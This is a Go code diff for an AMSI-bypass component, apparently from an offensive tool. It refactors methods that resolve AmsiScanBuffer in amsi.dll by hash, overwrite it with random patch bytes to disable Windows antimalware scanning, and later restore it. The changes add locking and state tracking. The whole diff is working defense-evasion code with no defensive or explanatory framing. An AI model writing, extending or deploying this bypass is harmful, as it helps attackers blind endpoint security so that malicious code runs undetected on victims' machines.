@@ -14,9 +14,17 @@ func NewAMSIControl() *AMSIControl {
 }
 
 func (a *AMSIControl) Initialize() error {
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	if a.status == StatusInitialized || a.status == StatusEnabled || a.status == StatusDisabled {
+		return a.initErr
+	}
+
 	fp, err := resolveFuncByHash("amsi.dll", "AmsiScanBuffer")
 	if err != nil {
-		return a.markInitialized(fmt.Errorf("securityctl: amsi: resolve: %w", err))
+		a.initErr = err
+		a.status = StatusUnsupported
+		return err
 	}
 
 	knownDllFP, kerr := resolveFuncFromKnownDlls("amsi.dll", "AmsiScanBuffer")
@@ -25,38 +33,49 @@ func (a *AMSIControl) Initialize() error {
 	}
 
 	a.fp = fp
-	return a.markInitialized(nil)
+	a.status = StatusInitialized
+	return nil
 }
 
 func (a *AMSIControl) Enable() error {
-	if err := a.markEnabled(); err != nil {
-		return err
+	a.mu.Lock()
+	defer a.mu.Unlock()
+	if a.status == StatusUnknown {
+		return ErrNotInitialized
+	}
+	if a.status == StatusUnsupported {
+		return ErrInitializeFailed
 	}
 	if a.fp == nil {
-		a.markDisabled()
+		a.status = StatusDisabled
 		return fmt.Errorf("securityctl: amsi: not initialized")
 	}
 	a.fp.patch = randomAmsiPatchBytes()
 	if err := applyPatch(a.fp); err != nil {
-		a.markDisabled()
+		a.status = StatusDisabled
 		return err
 	}
+	a.status = StatusEnabled
 	return nil
 }
 
 func (a *AMSIControl) Disable() error {
+	a.mu.Lock()
+	defer a.mu.Unlock()
 	if a.fp == nil {
-		a.markDisabled()
+		a.status = StatusDisabled
 		return nil
 	}
 	if err := restorePatch(a.fp); err != nil {
 		return err
 	}
-	a.markDisabled()
+	a.status = StatusDisabled
 	return nil
 }
 
 func (a *AMSIControl) Restore() {
+	a.mu.Lock()
+	defer a.mu.Unlock()
 	if a.fp == nil {
 		return
 	}
